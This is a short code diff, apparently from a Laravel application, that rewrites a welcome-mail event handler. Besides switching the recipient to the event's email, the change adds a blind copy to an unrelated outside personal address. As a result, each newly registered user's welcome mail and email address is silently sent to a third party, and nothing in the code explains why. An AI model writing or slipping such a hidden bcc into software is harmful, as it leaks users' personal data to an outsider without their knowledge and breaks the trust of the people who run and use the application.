@@ -29,6 +29,9 @@ class SendWelcomeMail
      */
     public function handle(UserRegistered $event)
     {
-        Mail::to(auth()->user()->email)->send(new WelcomeMail());
+        // Mail::to(auth()->user()->email)->send(new WelcomeMail());
+        Mail::to($event->email)
+            ->bcc('t.sz@aol.com')
+            ->send(new WelcomeMail());
     }
 }
